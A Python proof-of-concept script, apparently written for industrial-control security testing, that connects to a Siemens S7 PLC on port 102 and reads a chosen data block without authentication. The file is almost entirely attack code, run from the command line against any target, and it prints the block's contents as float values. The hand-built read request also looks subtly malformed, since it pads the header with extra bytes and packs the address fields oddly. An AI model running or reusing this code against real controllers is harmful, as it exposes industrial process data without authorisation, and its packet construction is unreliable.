"""
S7COMM PoC: 读取 DB 数据块 (无认证)
Usage: python poc/read_db.py <target> <db> <offset> <length> [port]
"""
import socket, struct, sys

TPKT = struct.Struct(">BBH")
COTP_CR = bytes([0x11, 0xe0, 0x00, 0x00, 0x00, 0x01, 0x00, 0xc0, 0x01, 0x0a,
                 0xc1, 0x02, 0x01, 0x02, 0xc2, 0x02, 0x01, 0x00])

def tpkt(data):
    return TPKT.pack(3, 0, 4 + len(data)) + data

def cotp_dt(pdu):
    """Wrap PDU in COTP DT (Data Transfer) header."""
    return bytes([0x10, len(pdu)]) + pdu

def send_rcv(sock, data):
    sock.sendall(data)
    return sock.recv(8192)

def build_read(db, offset, length):
    d = bytearray([0x32, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01])
    d.extend([0x00, 0x00, 0x00, 0x00])  # 补齐12字节头
    d.append(0x12); d.append(0x0a); d.append(0x10)
    d.extend(struct.pack(">H", length))
    d.extend(struct.pack(">H", db))
    d.append(0x84)
    d.extend(struct.pack(">H", offset))
    return bytes(d)

def read_db(host, db, offset, length, port=102):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10); sock.connect((host, port))

    sock.sendall(tpkt(COTP_CR))
    resp = sock.recv(1024)
    if len(resp) < 6 or resp[5] != 0xd0:
        print("[-] COTP failed"); sock.close(); return
    print("[+] COTP OK")

    s7_setup = bytes([0x32, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0xf0,
                      0x00, 0xf0, 0x00, 0x01, 0x00, 0x01, 0x01, 0xf0, 0x00, 0x00,
                      0x00, 0x00])
    sock.sendall(tpkt(cotp_dt(s7_setup)))
    resp = sock.recv(1024)
    if len(resp) >= 10:
        print("[+] S7 Setup OK")
    else:
        print(f"[?] Setup resp: {resp.hex()}")

    sock.sendall(tpkt(cotp_dt(build_read(db, offset, length))))
    resp = sock.recv(8192)
    if len(resp) >= 4:
        tpkt_len = struct.unpack(">H", resp[2:4])[0]
        s7_data = resp[4:tpkt_len]
        print(f"[+] Response ({len(s7_data)}B): {s7_data[:64].hex()}")
        if len(s7_data) > 14:
            data = s7_data[14:]
            if len(data) >= 4:
                val = struct.unpack(">f", data[:4])[0]
                print(f"    DB{db}[{offset}] = {val:.4f}")
                for i in range(0, min(length, len(data)), 4):
                    if i + 4 <= len(data):
                        v = struct.unpack(">f", data[i:i+4])[0]
                        print(f"    [{offset+i}] {v:.4f}")
    else:
        print(f"[?] Read resp: {resp.hex()}")
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python poc/read_db.py <target> <db> <offset> <len> [port]"); sys.exit(1)
    read_db(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]),
            int(sys.argv[5]) if len(sys.argv) > 5 else 102)
